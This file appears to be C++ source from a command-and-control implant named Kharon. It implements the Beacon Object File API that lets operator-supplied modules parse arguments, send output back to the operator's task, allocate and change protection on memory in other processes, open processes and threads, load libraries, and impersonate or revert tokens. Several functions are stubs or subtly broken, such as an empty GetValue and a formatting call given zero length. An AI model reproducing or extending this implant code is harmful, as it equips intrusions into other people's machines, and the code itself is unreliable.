#include <Kharon.h>

auto Coff::DataParse(
    DATAP* parser, 
    PCHAR  buffer, 
    INT    size
) -> VOID {
    G_KHARON

    if (parser == NULL) {
        return;
    }

    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size - 4;
    parser->size     = size - 4;
    parser->buffer   += 4;
}

auto Coff::Output( 
    INT  type, 
    PCCH data, 
    INT  len
) -> VOID {
    G_KHARON

    VOID* MemRange  = __builtin_return_address( 0 );
    ULONG CommandID = 0;
    CHAR* UUID      = nullptr;

    CommandID = Self->Cf->GetCmdID( MemRange );
    UUID      = Self->Cf->GetTask( MemRange );
    
    Self->Pkg->SendOut( UUID, CommandID, (BYTE*)data, len, type );
}

auto Coff::Printf(
    INT  type,
    PCCH fmt,
    ...
) -> VOID {
    G_KHARON

    va_list VaList = { 0 };
    va_start( VaList, fmt );

    VOID* MemRange = __builtin_return_address( 0 );
    CHAR* UUID     = nullptr;
    ULONG MsgSize  = 0;
    CHAR* MsgBuff  = nullptr;
    
    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
    if ( MsgSize < 0 ) {
        KhDbg( "failed get the formated message size" ); goto _KH_END;
    }

    MsgBuff = (CHAR*)Self->Hp->Alloc( MsgSize +1 );

    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, fmt, VaList ) < 0 ) {
        KhDbg( "failed formating string" ); goto _KH_END;
    }

    UUID = Self->Cf->GetTask( MemRange );

    KhDbg( "Message to send to the task id %s: %s [%d bytes]", UUID, MsgBuff, MsgSize );

    Self->Pkg->SendMsg( UUID, MsgBuff, type );

_KH_END:
    if ( VaList  ) va_end( VaList );
    if ( MsgBuff ) Self->Hp->Free( MsgBuff );
}

auto Coff::DataExtract(
    DATAP* parser, 
    PINT   size
) -> PCHAR {
    G_KHARON
    return (PCHAR)Self->Psr->Bytes( (PPARSER)parser, (ULONG*)size );
}

auto Coff::DataInt(
    DATAP* parser
)-> INT {
    G_KHARON
    return Self->Psr->Int32( (PPARSER)parser );
}

auto Coff::DataShort(
    DATAP* parser
) -> SHORT {
    G_KHARON
    return Self->Psr->Int16( (PPARSER)parser );
}

auto Coff::DataLength(
    DATAP* parser
) -> INT32 {
    return parser->length;
}

auto Coff::FmtAlloc(
    FMTP*  Fmt,
    INT32  Maxsz
) -> VOID {
    G_KHARON

    if ( !Fmt ) return;

    Fmt->original = (CHAR*)Self->Hp->Alloc( Maxsz );
    Fmt->buffer   = Fmt->original;
    Fmt->length   = 0;
    Fmt->size     = Maxsz;
}

auto Coff::FmtReset(
    FMTP* Fmt
) -> VOID {
    Mem::Zero( (UPTR)Fmt->original, Fmt->size );
    Fmt->buffer = Fmt->original;
    Fmt->length = Fmt->size;
}

auto Coff::FmtAppend(
    FMTP* Fmt,
    CHAR* Data,
    INT32 Len
) -> VOID {
    Mem::Copy( Fmt->buffer, Data, Len );
    Fmt->buffer += Len;
    Fmt->length += Len;
}

auto Coff::FmtPrintf(
    FMTP* Fmt,
    CHAR* Data,
    ...
) -> VOID {
    G_KHARON

    va_list Args = { 0 };
    INT32   Len  = 0;

    va_start( Args, Data );
    Len = Self->Msvcrt.vsnprintf( Fmt->buffer, Len, Data, Args );
    va_end( Args );

    Fmt->buffer += Len;
    Fmt->length += Len;
}

auto Coff::FmtInt(
    FMTP* Fmt,
    INT32 Val
) -> VOID {
    if ( Fmt->length + 4 > Fmt->size ) return;

    Mem::Copy( Fmt->buffer, &Val, 4 );
    Fmt->buffer += 4;
    Fmt->length += 4;
    return;
}

auto Coff::GetSpawn(
    BOOL  x86, 
    CHAR* buffer, 
    INT32 length
)-> VOID {
    G_KHARON

    if ( !buffer ) return;

    // return Self->Ps->Ctx
}

auto Coff::FmtFree(
    FMTP* Fmt
)-> VOID {
    G_KHARON

    if ( !Fmt ) return;

    if ( Fmt->original ) {
        Self->Hp->Free( Fmt->original );
        Fmt->original = nullptr;
    }
    
    Fmt->buffer = nullptr;
    Fmt->length = Fmt->size = 0;
}

auto Coff::OpenProcess(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD processId
) -> HANDLE {
    G_KHARON
    return Self->Ps->Open( desiredAccess, inheritHandle, processId );
}

auto Coff::VirtualAlloc(
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    G_KHARON
    return Self->Mm->Alloc( Address, Size, AllocType, Protect );
}

auto Coff::VirtualAllocEx(
    HANDLE Handle,
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    G_KHARON
    return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
}

auto Coff::VirtualProtect(
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    G_KHARON

    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect );
}

auto Coff::VirtualProtectEx(
    HANDLE Handle,
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    G_KHARON
    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect, Handle );
}

auto Coff::OpenThread(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD threadId
) -> HANDLE {
    G_KHARON
    return Self->Td->Open( desiredAccess, inheritHandle, threadId );
}

auto Coff::LoadLibraryA(
    _In_ PCHAR LibraryName
) -> HMODULE {
    G_KHARON
    return (HMODULE)Self->Lib->Load( LibraryName );
}

auto Coff::UseToken(
    HANDLE token
) -> BOOL {
    G_KHARON

    return Self->Tkn->Use( token );
}

auto Coff::RevertToken(
    VOID
) -> VOID {
    G_KHARON

    Self->Tkn->Rev2Self();
}

auto Coff::AddValue(
    PCCH  key, 
    PVOID ptr
) -> BOOL {
    G_KHARON

    if ( Self->Cf->GetValue( key ) ) return FALSE;

    USER_DATA* NewData = (USER_DATA*)Self->Hp->Alloc( sizeof( USER_DATA ) );
    if ( ! NewData ) return FALSE;

    NewData->Key = (CHAR*)key;
    NewData->Ptr = ptr;

    if ( ! Self->Cf->UserData ) {
        Self->Cf->UserData = NewData;
    } else {
        USER_DATA* Head = Self->Cf->UserData;
        while ( Head->Next ) {
            Head = Head->Next;
        }
        Head->Next = NewData;
    }

    return TRUE;
}

auto Coff::GetValue(
    PCCH key
) -> PVOID {

}

auto Coff::RmValue(
    PCCH key
) -> BOOL {

}

// auto Coff::DataStoreGetItem(
//     SIZE_T Index
// ) -> DATA_STORE* {
//     G_KHARON

//     return Self->Cf->Store[Index];
// }

// auto Coff::DataStoreProtectItem(
//     SIZE_T Index
// ) -> VOID {
//     G_KHARON

//     if ( Self->Cf->Store[Index] ) {
//         Self->Crp->Xor( 
//             (BYTE*)Self->Cf->Store[Index]->Buffer, 
//             Self->Cf->Store[Index]->Length 
//         );

//         Self->Cf->Store[Index]->Masked = TRUE;
//     }

//     return;
// }

// auto Coff::DataStoreUnprotectItem(
//     SIZE_T Index
// ) -> VOID {
//     G_KHARON

//     if ( Self->Cf->Store[Index] ) {
//         Self->Crp->Xor( 
//             (BYTE*)Self->Cf->Store[Index]->Buffer, 
//             Self->Cf->Store[Index]->Length 
//         );

//         Self->Cf->Store[Index]->Masked = FALSE;
//     }

//     return;
// }

// auto Coff::DataStoreMaxEntries(
//     VOID
// ) -> SIZE_T {
//     G_KHARON

//     return sizeof( Self->Cf->Store );
// }